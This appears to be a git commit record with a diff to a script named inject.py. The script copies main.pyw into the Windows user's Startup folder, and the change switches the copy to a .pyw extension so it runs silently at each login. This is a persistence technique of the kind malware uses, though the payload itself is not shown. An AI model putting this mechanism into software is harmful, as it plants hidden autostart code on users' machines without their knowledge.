a2bf40c7f967433a74cf85dafc70bb8c7428e853
user2020-py <x_bomba@inbox.ru>
2022-12-11 14:08:58 +0500

    test

--- inject.py
+++ inject.py
@@ -2,5 +2,5 @@ import os
 from shutil import copyfile
 copyfile(
     "main.pyw",
-    f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py"
+    f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.pyw"
 )
